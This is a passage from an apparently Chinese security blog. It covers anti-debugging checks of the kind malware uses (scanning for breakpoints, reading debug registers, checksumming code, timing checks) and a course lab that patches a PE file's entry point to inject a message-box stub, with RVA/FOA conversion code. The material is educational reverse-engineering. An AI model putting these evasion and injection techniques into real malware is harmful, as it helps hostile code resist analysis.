(PIMAGE_DOS_HEADER)dwBaseImage;  <br>    pNtHeaders = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);  <br>    pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders + <span class="hljs-built_in">sizeof</span>(pNtHeaders-&gt;Signature) + <span class="hljs-built_in">sizeof</span>(IMAGE_FILE_HEADER) +   <br>                     (WORD)pNtHeaders-&gt;FileHeader.SizeOfOptionalHeader);  <br>    DWORD dwAddr = pSectionHeader-&gt;VirtualAddress + dwBaseImage;   <br>    DWORD dwCodeSize = pSectionHeader-&gt;SizeOfRawData;      <br>    BOOL Found = FALSE;  <br>    __asm  <br>    &#123;  <br>        cld               <br>        mov     edi,dwAddr  <br>        mov     ecx,dwCodeSize  <br>        mov     al,<span class="hljs-number">0</span>CCH   <br>        repne   scasb  <br>        jnz     NotFound  <br>        mov Found,<span class="hljs-number">1</span>  <br>NotFound:           <br>    &#125;  <br>    <span class="hljs-keyword">return</span> Found;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-硬件断点检查"><a href="#2-硬件断点检查" class="headerlink" title="2.硬件断点检查"></a>2.硬件断点检查</h3><p>DR0、Dr1、Dr2、Dr3用于设置硬件断点，<strong>由于只有4个硬件断点寄存器</strong>，所以同时最多只能设置4个硬件断点。DR4、DR5由系统保留。  DR6、DR7用于记录Dr0-Dr3中断点的相关属性。如果没有硬件断点，那么DR0、DR1、DR2、DR3这4个寄存器的值都为0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">CheckDebug</span><span class="hljs-params">()</span>  <br>&#123;  <br>    CONTEXT context;    <br>    HANDLE hThread = GetCurrentThread();    <br>    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;    <br>    GetThreadContext(hThread, &amp;context);    <br>    <span class="hljs-keyword">if</span> (context.Dr0 != <span class="hljs-number">0</span> || context.Dr1 != <span class="hljs-number">0</span> || context.Dr2 != <span class="hljs-number">0</span> || context.Dr3!=<span class="hljs-number">0</span>)     <br>    &#123;    <br>        <span class="hljs-keyword">return</span> TRUE;    <br>    &#125;    <br>    <span class="hljs-keyword">return</span> FALSE;    <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-执行代码校验和检查"><a href="#3-执行代码校验和检查" class="headerlink" title="3. 执行代码校验和检查"></a>3. 执行代码校验和检查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">CheckDebug</span><span class="hljs-params">()</span>  <br>&#123;  <br>    PIMAGE_DOS_HEADER pDosHeader;  <br>    PIMAGE_NT_HEADERS32 pNtHeaders;  <br>    PIMAGE_SECTION_HEADER pSectionHeader;  <br>    DWORD dwBaseImage = (DWORD)GetModuleHandle(<span class="hljs-literal">NULL</span>);   <br>    pDosHeader = (PIMAGE_DOS_HEADER)dwBaseImage;  <br>    pNtHeaders = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);  <br>    pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders + <span class="hljs-keyword">sizeof</span>(pNtHeaders-&gt;Signature) + <span class="hljs-keyword">sizeof</span>(IMAGE_FILE_HEADER) + (WORD)pNtHeaders-&gt;FileHeader.SizeOfOptionalHeader);  <br>    DWORD dwAddr = pSectionHeader-&gt;VirtualAddress + dwBaseImage;   <br>    DWORD dwCodeSize = pSectionHeader-&gt;SizeOfRawData;      <br>    DWORD checksum = <span class="hljs-number">0</span>;  <br>    __asm  <br>    &#123;  <br>        cld  <br>        mov     esi, dwAddr  <br>        mov     ecx, dwCodeSize  <br>        xor eax, eax  <br>    checksum_loop :  <br>        movzx    ebx, byte ptr[esi]  <br>        add        eax, ebx  <br>        rol eax, <span class="hljs-number">1</span>  <br>        inc esi  <br>        loop       checksum_loop  <br>        mov checksum, eax  <br>    &#125;  <br>    <span class="hljs-keyword">if</span> (checksum != <span class="hljs-number">0x46ea24</span>)  <br>    &#123;  <br>        <span class="hljs-keyword">return</span> FALSE;  <br>    &#125;  <br>    <span class="hljs-keyword">else</span>  <br>    &#123;  <br>        <span class="hljs-keyword">return</span> TRUE;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-时钟检测"><a href="#4-时钟检测" class="headerlink" title="4. 时钟检测"></a>4. 时钟检测</h3><p>被调试时，进程的运行速度大大降低，例如，单步调试大幅降低恶意代码的运行速度，所以时钟检测是恶意代码探测调试器存在的最常用方式之一。有如下两种用时钟检测来探测调试器存在的方法。<br><strong>记录一段操作前后的时间戳，然后比较这两个时间戳，如果存在滞后，则可以认为存在调试器。</strong><br><strong>记录触发一个异常前后的时间戳。如果不调试进程，可以很快处理完异常，因为调试器处理异常的速度非常慢。</strong>默认情况下，调试器处理异常时需要人为干预，这导致大量延迟。虽然很多调试器允许我们忽略异常，将异常直接返回程序，但这样操作仍然存在不小的延迟。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>Anti</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>anti</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>软件安全实验T3</title>
    <link href="/2023/10/21/software_security_task3/"/>
    <url>/2023/10/21/software_security_task3/</url>
    
    <content type="html"><![CDATA[<p>《软件安全》课程T3实验任务详细步骤</p><span id="more"></span><h3 id="1-修改函数入口点地址，使得hello25-exe直接弹出第二个消息框"><a href="#1-修改函数入口点地址，使得hello25-exe直接弹出第二个消息框" class="headerlink" title="1.修改函数入口点地址，使得hello25.exe直接弹出第二个消息框"></a>1.修改函数入口点地址，使得hello25.exe直接弹出第二个消息框</h3><p>知识铺垫：</p><p>（1）EXE装载流程：</p><ul><li>首先操作系统给exe文件分配4GB的虚拟空间，其中高2G用于操作系统的函数，比如<code>uer32.dll</code>，低2G用于用户的使用。分配完空间后，把exe本身的代码加载到由ImageBase指定的地址，通常来说是<code>0x400000</code>。</li><li>其次，操作系统往4GB空间中加载各种DLL文件，由于DLL文件往往会有冲突，不能按照预计ImageBase装载，因此需要使用DLL本身提供的重定位表修复自己的地址。（DLL文件与EXE文件一样，都是PE结构）</li><li>——执行其他的操作——，后续再探究</li><li>然后操作系统跳转到由<code>AddressOfEntryPoint+ImageBase</code>的地址进行执行代码</li></ul><p>（2）RVA，FOA是什么：</p><p>RVA</p><p>在解释此名词之前，需要明白一件事情，即PE文件实际上有两种存在状态，一种是存储在硬盘中，也就是16进制编辑器打开的样子，还有一种则是运行时，操作系统会分配一个独立的虚拟空间给它，通常这个虚拟空间大小是4GB，然后把这个文件装载到这个4GB中，装载到哪，则是先由ImageBase字段决定，一旦确定好从哪个地方装载，就相当于确定了一个基址，而这个RVA就是相对这个基址的偏移。</p><p>比如这个文件从内存中0x10000000开始装载，如果RVA是0x32，那么在内存中它的地址就是0x10000032</p><p>FOA</p><p>既然PE文件有两种格式，那么偏移肯定也有两种，刚刚的提及的RVA是在虚拟内存中的，那么还有一种就是在文件中的偏移，即FOA - File Offset Address，也就是在16进制文本编辑器里的偏移</p><p>RVA和FOA的概念会贯穿整个PE文件的学习，一定要理解清楚</p><p>现在就可以开始修改OEP了。</p><p>利用PE相关工具查询PE文件结构</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20192021.png"></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20191646.png"></p><p>可以看到其<code>ImageBase</code>是<code>0x400000</code>，<code>AddressOfEntryPoint</code>是<code>0x1000</code>，那么其在加载后应该从<code>0x401000</code>开始执行，将其载入OD或者x32dbg。（我使用的是x32dbg）</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20193002.png"></p><p>发现其果然是从<code>0x401000</code>处开始执行，与预期相符。</p><p>那么只需要修改OEP即可，问题是修改去哪呢？</p><p>这里需要知道<code>MessageBox</code>()的的使用，以及传参方式：</p><blockquote><p>传参方式：在32位程序中，函数的参数通常都是通过栈来传递的，并且遵循相关的调用约定，比如先把哪个函数压栈，由谁来清栈</p><p>而在这里，是先把左边的参数压栈。比如传递参数<code>MessageBox(a,b,c,d)</code>，则先<code>push a</code>，再<code>push b</code>等。</p><p>参数的含义：Messagebox(a,b,c,d)中，参数<code>a</code>是所属句柄，也就是这个窗口属于谁，在这里默认为0或者保持一致也行，Win没有对此有严格的检查；参数<code>b</code>是标题；参数<code>c</code>是文本内容；参数<code>d</code>是窗口类型，比如是正确错误框，还是警告框，默认为0即可</p><p>相关信息可以查询<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-messagebox">MSDN</a>]</p></blockquote><p>因此只需要把OEP改到<code>0x401016</code>即可，也就是把<code>AddressOfEntryPoint</code>改为<code>1016</code></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20193249.png"></p><h3 id="2-打开hello25-exe，对其中给定任意RVA地址，将其转换成文件偏移，并在文件中找到对应数据"><a href="#2-打开hello25-exe，对其中给定任意RVA地址，将其转换成文件偏移，并在文件中找到对应数据" class="headerlink" title="2.打开hello25.exe，对其中给定任意RVA地址，将其转换成文件偏移，并在文件中找到对应数据"></a>2.打开hello25.exe，对其中给定任意RVA地址，将其转换成文件偏移，并在文件中找到对应数据</h3><p>知识铺垫：</p><p>相信你已经知道RVA和FOA是什么，那么继续探究Windows是怎样把PE文件加载进内存的吧！</p><p>之前提及Windows会分配4GB空间，然后把PE自己的代码装载进低2G，并且是从<code>ImageBase</code>处开始优先装载，那么是不是就是从<code>ImageBase</code>处开始一个字节一个字节装载呢？</p><p>是但不完全是，在此之前，我们需要对PE文件结构有一个宏观的认识</p><p>这里我直接贴一张大图，建议分屏放大浏览观看</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202310130834634.jpg"></p><p>只看最上面一行，可以发现PE文件大致分为如下几部分</p><ul><li>IMGAE_DOS_HEADR - DOS头</li><li>DOS STUB - DOS填充</li><li>IMAGE_NT_HEADR - NT头</li><li>SECTION_TABLE - 节表</li><li>SECTIONS - 节&#x2F;节区</li><li>OTHERS</li></ul><p>每个部分又或多或少引申出许多小表，其实这些小表就是一个一个结构体，存储在PE文件结构中。可以这么说：PE文件结构就是由许许多多的结构体组成，每个结构体里的每个成员都有相应的含义，比如指示哪个部分的开始，哪个部分的结束，在指来指去的过程中，整个文件运行所需要的信息也就明确了。</p><p>而操作系统会把<code>IMGAE_DOS_HEADR DOS-STUB IMAGE_NT_HEADR SECTION_TABLE</code> 直接从ImageBase处开始copy，在<code>OPTIONAL_HEADER</code>里有一个字段<code>SizeOfHeaders</code>指明了这些大小（文件对齐后的大小），因此操作系统可以直接copy这么大的数据</p><p>可以简单比较一下</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20203224.png"></p><p>可以发现是一模一样的，可以自行比对后面的0x200字节</p><p>这些节表的数据copy完了，那节区的数据呢？</p><p>我们需要知道一个东西，也就是一个节表会对应一个节区，节表里面会有节区的相关信息，比如起始位置、大小、执行权限等，这里面与RVA、FOA相关的就是</p><p>这里直接给出完整的说明吧</p><blockquote><p>typedef struct _IMAGE_SECTION_HEADER {<br>    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];&#x2F;&#x2F;8个字节 IMAGE_SIZEOF_SHORT_NAME是宏 等于8 一般是ascii码 节区名字<br>    union {<br>            DWORD   PhysicalAddress;<br>            DWORD   VirtualSize;<br>    } Misc;&#x2F;&#x2F; 注意是联合体，其含义是没有对齐的在内存中真实尺寸 该值可以不准确<br>    DWORD   VirtualAddress;&#x2F;&#x2F; 节区在内存中的偏移地址，是RVA<br>    DWORD   SizeOfRawData;&#x2F;&#x2F; 节区在文件中对齐后的尺寸<br>    DWORD   PointerToRawData;&#x2F;&#x2F; 节区在文件中偏移<br>    DWORD   PointerToRelocations;&#x2F;&#x2F; 在obj文件中使用 对exe无意义<br>    DWORD   PointerToLinenumbers;&#x2F;&#x2F; 行号表的位置 调试时使用<br>    WORD    NumberOfRelocations;&#x2F;&#x2F; 在obj中使用 对exe无意义<br>    WORD    NumberOfLinenumbers;&#x2F;&#x2F; 行号表的数量 调试时使用<br>    DWORD   Characteristics;&#x2F;&#x2F; 节区属性 可写可读可执行等 通过或的形式来添加属性<br>                                &#x2F;&#x2F;0x00000020 含可执行代码 0x20000000 该块可执行 0x40000000 可读 0x80000000 可写<br>} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</p></blockquote><p>操作系统就根据其中的<code>PointerToRawData</code>在文件中找到相应位置，copy到<code>VirtualAddress</code>处的地址，大小为<code>SizeOfRawData</code>。</p><p>遍历完节表，也就copy完所有的数据。</p><p>终于，现在可以好好讲讲RVA如何与FOA互转了</p><p>先讲FOA到RVA，即给定一个FOA，如何确定RVA？</p><p>对于所有的头部数据，即<code>IMGAE_DOS_HEADR DOS-STUB IMAGE_NT_HEADR SECTION_TABLE</code>，操作系统是直接复制，它们的RVA和FOA是相同的。（！要记住，RVA和FOA都是偏移地址，不是绝对地址！）</p><p>而对于节区的数据，则先得确定属于哪个节区，这个当然好办，一个节区一个节区的看呗，看FOA是否大于节区的起始地址<code>PointerToRawData</code>，同时又小于这个节区的结束地址<code>PointerToRawData+SizeOfRawData</code>，确定完节区后，就可以知道该节区的在内存的地址即<code>VirtualAddress</code>，计算一下节区偏移<code>FOA-PointerToRawData</code>，再加上节区再内存中起始地址，即可得到RVA</p><p>再讲RVA到FOA，即定一个RVA，如何确定其FOA？</p><p>同样，对于所有的头部数据，即<code>IMGAE_DOS_HEADR DOS-STUB IMAGE_NT_HEADR SECTION_TABLE</code>，操作系统是直接复制，它们的RVA和FOA是相同的。</p><p>然后也是确定RVA属于哪一个节区，按照上面的流程走一遍即可(确定节区 &#x3D;&gt; 计算节区偏移 &#x3D;&gt; 计算文件偏移 &#x3D;&gt; <code>RVA - VirtualAddress + PointerToRawData</code>  )</p><p>这里给出我的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><br>DWORD <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    DWORD size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><br>DWORD <span class="hljs-title function_">FOA_TO_RVA</span><span class="hljs-params">(DWORD FOA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>   PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FileHeader= <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br><span class="hljs-keyword">if</span> (FOA &lt; OptionalHeader-&gt;SizeOfHeaders)<br>&#123;<br><span class="hljs-keyword">return</span> FOA;<br>&#125;<br><br>   <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(FOA &gt;= SectionHeader-&gt;PointerToRawData&amp;&amp; FOA &lt; (SectionHeader +<span class="hljs-number">1</span>)-&gt;PointerToRawData)&#123;<br>            DWORD offset = FOA - SectionHeader-&gt;PointerToRawData;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;VirtualAddress + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader += <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//最后一个节区</span><br>    DWORD offset = FOA - SectionHeader-&gt;PointerToRawData;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;VirtualAddress + offset;<br>&#125;<br><br>DWORD <span class="hljs-title function_">RVA_TO_FOA</span><span class="hljs-params">(DWORD RVA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>   PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS32 NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER32 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    <br><br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER32)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br>    <br>    <span class="hljs-keyword">if</span> (RVA &lt; OptionalHeader-&gt;SizeOfHeaders)<br>&#123;<br><span class="hljs-keyword">return</span> RVA;<br>&#125;<br> <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(RVA &gt;= SectionHeader-&gt;VirtualAddress &amp;&amp; RVA &lt; (SectionHeader+<span class="hljs-number">1</span>)-&gt;VirtualAddress)&#123;<br>            DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader +=<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>     <span class="hljs-comment">//最后一个节区</span><br>    DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span>* buffer;<br><br>    FILE* fp1 = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp1, <span class="hljs-string">&quot;YOU_PATH_TO_EXE&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br><br>    DWORD size = Size(fp1);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp1);<br><br>    <span class="hljs-comment">//Choose one to execute</span><br>    <span class="hljs-comment">//printf(&quot;%X&quot;,RVA_TO_FOA(RVA,buffer));</span><br>    <span class="hljs-comment">//printf(&quot;%X&quot;,FOA_TO_RVA(FOA,buffer));</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;   <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-修改hello25-exe的代码段，使其弹出第三个消息框（包含自己学号和姓名）"><a href="#3-修改hello25-exe的代码段，使其弹出第三个消息框（包含自己学号和姓名）" class="headerlink" title="3.修改hello25.exe的代码段，使其弹出第三个消息框（包含自己学号和姓名）"></a>3.修改hello25.exe的代码段，使其弹出第三个消息框（包含自己学号和姓名）</h3><p>  这里我的思路也是修改OEP，然后jmp回原来的代码处</p><p>先在原文件处查找一些空白区（没有权限，就给他加权限就是了），填入学号姓名</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20213759.png"></p><p>然后编写弹窗函数，也就是4个push和1个call，可以看看原来的是怎么调用的，</p><p>这里<code>push</code>操作码是<code>0x68</code>,<code>call</code>的操作码是<code>0xE8</code>，<code>jmp</code>的操作码是<code>0xE9</code>，这两个后面都跟一个4字节地址，先把操作码填入</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20214130.png"></p><p>然后我们可以先修改OEP，检查是否正确设置。</p><p>修改OEP也就是修改<code>AddressOfEntryPoint</code>，也就是我们需要计算<code>0x8B0</code>的RVA然后填入。</p><p>这里就利用刚刚贴出的代码直接计算了(后续不再贴出计算截图，无非就是换个数据，换个函数而已)</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20214749.png"></p><p>可见是RVA是<code>30B0</code>，那么就把<code>AddressOfEntryPoint</code>改为<code>30B0</code></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20214818.png"></p><p>然后再拖入<code>x32dbg</code>，查看</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20214849.png"></p><p>发现已经修改成功，只差计算那几个地址了！</p><p>在这里我们只需要关注第二第三个push的值和call以及jmp的值，另外两个push不是很重要。</p><p>这里要注意，不管我们是push还是进行跳转，它跟的操作数都是一个地址，而这个地址是都是在内存中的地址，并不是FOA。</p><p>因此我们需要计算一下我们填入的两个字符串的RVA是多少，在这里我的学号FOA是<code>0x890</code>，它对应的RVA是<code>0x3090</code>，姓名的FOA是<code>0x8A0</code>，其对应的RVA是<code>0x30A0</code>，那么就把RVA加上<code>ImageBase</code>就得到在内存中的值，也就是<code>0x403090</code> <code>0x4030A0</code></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20215805.png"></p><p>NOTE：修改的时候注意小端序</p><p>再拖入x32dbg查看</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20215847.png"></p><p>发现可以成功找到字符串，现在就是要计算跳转地址</p><p>在win32程序里面跳转地址是这样计算的：<code>要跳转的地址-下一条指令的地址</code></p><p>比方说有一个指令<code>call a</code>，这条指令的下一条指令地址是<code>0x1010</code>，a的地址是<code>0x1008</code>，那么其硬编码就是<code>E8 8</code>，即<code>E8 0x1010 - 0x1008</code></p><p>所以我们要找到<code>MessageBoxA</code>的地址，因为我们想调用这个函数</p><p>这里贴出如何寻找的截图</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20220557.png"></p><p>可以看到<code>MessageBoxA</code>的地址是<code>0x767F9050</code>(不同电脑会不一样，所以你跟我的不一样也正常），<code>call</code>的下一条指令地址是<code>0x4030C9</code>（但这个应该一样），那么操作码就应该这样计算<code>0x767F9D50 - 0x4030C9</code></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20221606.png"></p><p>同理<code>jmp</code>的操作码也是这样计算，我们需要跳回原来的OEP处即<code>0x401000</code></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20221222.png"></p><p>分别得到<code>call</code>的操作码<code>763F5F87</code>和<code>jmp</code>的操作码<code>FFFFDF32</code>，现在写入文件（也可以直接在x32dbg里面patch）</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20221656.png"></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20221718.png"></p><p>现在就可以执行我们的弹窗了</p><h3 id="4-修改hello25-exe，删除文件中引入函数节的MessageBoxA字符串，之后自行进行相应调整，使得hello25-exe弹框功能恢复正常。"><a href="#4-修改hello25-exe，删除文件中引入函数节的MessageBoxA字符串，之后自行进行相应调整，使得hello25-exe弹框功能恢复正常。" class="headerlink" title="4.修改hello25.exe，删除文件中引入函数节的MessageBoxA字符串，之后自行进行相应调整，使得hello25.exe弹框功能恢复正常。"></a>4.修改hello25.exe，删除文件中引入函数节的MessageBoxA字符串，之后自行进行相应调整，使得hello25.exe弹框功能恢复正常。</h3><p>首先我们需要知道引入函数节是个啥东西，这个字符串是咋用的</p><p>其实引入函数节就是导入表，所谓的导入表就是就相当于告诉别人自己要用什么。它可以通过OptionalHeader数据目录项的第二项找到</p><p><img 